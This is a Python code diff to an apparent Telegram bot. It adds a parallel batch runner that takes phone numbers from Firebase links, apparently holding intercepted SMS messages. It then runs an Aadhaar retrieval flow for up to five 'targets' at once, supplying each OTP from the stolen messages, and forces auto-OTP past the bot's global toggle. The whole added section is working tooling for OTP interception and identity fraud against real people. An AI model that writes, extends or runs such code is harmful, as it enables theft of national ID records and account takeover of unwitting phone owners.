@@ -78,7 +78,7 @@ auto_otp_state = {
     "enabled": False,
     "chat_id": None,
     "target_mobile": None,
-    "used_otps": set(),   # (url, msg_key) tuples
+    "used_otps": set(),  # (url, msg_key) tuples
 }
 
 
@@ -560,7 +560,10 @@ class AadhaarEngine:
 
     async def _try_firebase_otp(self, target_mobile, timeout=60):
         """Fetch OTP from Firebase links for the target mobile. Returns OTP or None."""
-        if not auto_otp_state.get("enabled"):
+        # Per-engine override for parallel batch mode
+        if getattr(self, "_force_auto_otp", False):
+            pass  # bypass global toggle
+        elif not auto_otp_state.get("enabled"):
             return None
         try:
             links = _load_firebase_links()
@@ -725,7 +728,7 @@ class AadhaarEngine:
                 # Prompt the Telegram user for OTP input and feed it to stdin
                 if "ENTER THE OTP RECEIVED ON YOUR REGISTERED MOBILE" in line:
                     auto_otp = None
-                    if auto_otp_state.get("enabled"):
+                    if auto_otp_state.get("enabled") or getattr(self, "_force_auto_otp", False):
                         self.update_status("🔥 <b>Auto-OTP:</b> Firebase se OTP 1 ka wait...")
                         auto_otp = await self._try_firebase_otp(mobile, timeout=60)
 
@@ -861,7 +864,7 @@ class AadhaarEngine:
 
                     if "ENTER THE OTP RECEIVED ON YOUR REGISTERED MOBILE" in line:
                         auto_otp = None
-                        if auto_otp_state.get("enabled"):
+                        if auto_otp_state.get("enabled") or getattr(self, "_force_auto_otp", False):
                             self.update_status("🔥 <b>Auto-OTP:</b> Firebase se OTP 2 ka wait...")
                             auto_otp = await self._try_firebase_otp(mobile, timeout=60)
 
@@ -1203,3 +1206,210 @@ def prewarm_engine(bot, chat_id, mobile=None):
             asyncio.set_event_loop(loop)
         if mobile:
             loop.create_task(engine._early_phase1_loop(mobile))
+
+
+# ==============================================================================
+# 🚀 PARALLEL FIREBASE BATCH RUNNER (bb_auto style)
+# ==============================================================================
+
+# Tracks currently running parallel batches
+parallel_batches = {}  # batch_id -> {"task": asyncio.Task, "chat_id": int}
+
+
+async def scan_all_firebase_phones(limit_per_link=40, max_targets=5):
+    """
+    Scan all configured Firebase links and return a deduplicated list of
+    {"phone": "...", "url": "...", "cid": "..."} up to max_targets entries.
+    """
+    links = _load_firebase_links()
+    if not links:
+        return []
+
+    found = []
+    seen_phones = set()
+
+    async with aiohttp.ClientSession() as session:
+        for entry in links:
+            url = entry.get("url")
+            if not url:
+                continue
+            try:
+                mapping = await firebase_find_phone_map(session, url, limit_devices=limit_per_link)
+                for phone, cid in mapping.items():
+                    if phone in seen_phones:
+                        continue
+                    seen_phones.add(phone)
+                    found.append({"phone": phone, "url": url, "cid": cid})
+                    if len(found) >= max_targets:
+                        return found
+            except Exception as e:
+                print(f"⚠️ [BATCH-SCAN] Error on {url}: {e}")
+                continue
+    return found
+
+
+async def _wait_for_otp_on_link(url, cid, target_phone, timeout=90, interval=3):
+    """
+    Wait for a fresh OTP on a specific Firebase (url, cid).
+    Returns OTP string or None.
+    """
+    async with aiohttp.ClientSession() as session:
+        # Small grace period to allow new SMS to land
+        await asyncio.sleep(2)
+        # Snapshot existing keys right before polling
+        known = await firebase_get_all_keys(session, url, cid)
+
+        # Wait for OTP
+        otp, key = await firebase_wait_for_otp(
+            url, cid, known, timeout=timeout, interval=interval, session=session
+        )
+        if otp:
+            auto_otp_state["used_otps"].add((url, key))
+        return otp
+
+
+async def run_parallel_batch(bot, chat_id, mobile_targets):
+    """
+    Launch the Aadhaar flow for up to 5 mobiles in parallel.
+    Each target gets its own AadhaarEngine instance with a target-bound OTP hook.
+    Results are posted to the chat as each finishes.
+    """
+    if not mobile_targets:
+        bot.send_message(chat_id, "❌ No targets to process.")
+        return
+
+    batch_id = str(uuid.uuid4())[:8]
+    print(f"🚀 [BATCH] Starting parallel batch {batch_id} with {len(mobile_targets)} targets")
+
+    # Build per-target metadata
+    targets_meta = []
+    for idx, tgt in enumerate(mobile_targets):
+        phone = tgt.get("phone") if isinstance(tgt, dict) else str(tgt)
+        url = tgt.get("url") if isinstance(tgt, dict) else None
+        cid = tgt.get("cid") if isinstance(tgt, dict) else None
+        targets_meta.append({
+            "phone": phone,
+            "url": url,
+            "cid": cid,
+            "index": idx,
+            "engine_chat_id": f"{chat_id}:p{idx}",
+        })
+
+    # Announce batch
+    lines = [f"🚀 <b>PARALLEL BATCH STARTED</b> ({batch_id})",
+             "━━━━━━━━━━━━━━━━━━━━━━",
+             f"👥 Targets: <b>{len(targets_meta)}</b>"]
+    for i, t in enumerate(targets_meta, 1):
+        lines.append(f"  {i}. <code>{t['phone']}</code>")
+    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
+    lines.append("⏳ Running all in parallel. Results posted as each finishes.")
+    try:
+        bot.send_message(chat_id, "\n".join(lines), parse_mode='HTML')
+    except Exception as e:
+        print(f"⚠️ [BATCH] Failed to announce: {e}")
+
+    real_chat_id = chat_id
+
+    async def _run_one(t):
+        phone = t["phone"]
+        url = t["url"]
+        cid = t["cid"]
+
+        # Create a fresh engine bound to a unique per-target chat_id
+        engine = AadhaarEngine(bot, chat_id=real_chat_id)
+
+        # Prefix every status update with the target phone for parallel readability
+        orig_update = engine.update_status
+
+        def prefixed_update(text, _phone=phone, _orig=orig_update):
+            prefix = f"📱 <b>[{_phone}]</b>\n"
+            try:
+                _orig(prefix + text)
+            except Exception as e:
+                print(f"⚠️ [BATCH] status update failed for {_phone}: {e}")
+
+        engine.update_status = prefixed_update
+
+        # Override _try_firebase_otp to use THIS target's link/cid only
+        async def bound_firebase_otp(target_mobile, timeout=90):
+            if not url or not cid:
+                return None
+            try:
+                engine.update_status("🔥 Firebase OTP wait...")
+                otp = await _wait_for_otp_on_link(url, cid, target_mobile, timeout=timeout)
+                if otp:
+                    print(f"🔥 [BATCH {batch_id}] [{phone}] OTP: {otp}")
+                return otp
+            except Exception as e:
+                print(f"⚠️ [BATCH {batch_id}] [{phone}] OTP error: {e}")
+                return None
+
+        engine._try_firebase_otp = bound_firebase_otp
+        engine._force_auto_otp = True  # bypass global auto toggle
+
+        try:
+            print(f"▶️ [BATCH {batch_id}] Starting Aadhaar flow for {phone}")
+            # Default prefix "Mrs" — the retrive-eid.py rotates through candidate prefixes
+            await engine.run_flow(real_chat_id, "Mrs", phone, None, user_info=None)
+            return {"phone": phone, "status": "done"}
+        except Exception as e:
+            err = str(e)
+            print(f"❌ [BATCH {batch_id}] [{phone}] Failed: {err}")
+            try:
+                bot.send_message(
+                    real_chat_id,
+                    f"❌ <b>[{phone}] Batch task failed:</b>\n<code>{escape_html(err)[:300]}</code>",
+                    parse_mode='HTML'
+                )
+            except: pass
+            return {"phone": phone, "status": "failed", "error": err}
+        finally:
+            try:
+                await engine.delete_temp_messages()
+            except: pass
+            try:
+                await engine.close()
+            except: pass
+
+    try:
+        results = await asyncio.gather(*[_run_one(t) for t in targets_meta], return_exceptions=True)
+    except Exception as e:
+        print(f"⚠️ [BATCH {batch_id}] gather error: {e}")
+        results = []
+
+    # Summary
+    done = sum(1 for r in results if isinstance(r, dict) and r.get("status") == "done")
+    failed = sum(1 for r in results if isinstance(r, dict) and r.get("status") == "failed")
+
+    summary = (
+        f"🏁 <b>PARALLEL BATCH COMPLETE</b> ({batch_id})\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"✅ Succeeded: <b>{done}</b>\n"
+        f"❌ Failed: <b>{failed}</b>\n"
+        f"👥 Total: <b>{len(targets_meta)}</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━"
+    )
+    try:
+        bot.send_message(real_chat_id, summary, parse_mode='HTML')
+    except: pass
+
+    print(f"🏁 [BATCH {batch_id}] Finished: {done} ok / {failed} failed")
+
+
+def start_parallel_batch(bot, chat_id, mobile_targets):
+    """
+    Fire-and-forget launcher: schedules the batch on the global event loop.
+    Returns True if scheduled.
+    """
+    global _running_loop
+    if not _running_loop or not _running_loop.is_running():
+        print("⚠️ [BATCH] Event loop not ready. Cannot start batch.")
+        return False
+
+    coro = run_parallel_batch(bot, chat_id, mobile_targets)
+    try:
+        asyncio.run_coroutine_threadsafe(coro, _running_loop)
+        return True
+    except Exception as e:
+        print(f"⚠️ [BATCH] Failed to schedule: {e}")
+        return False
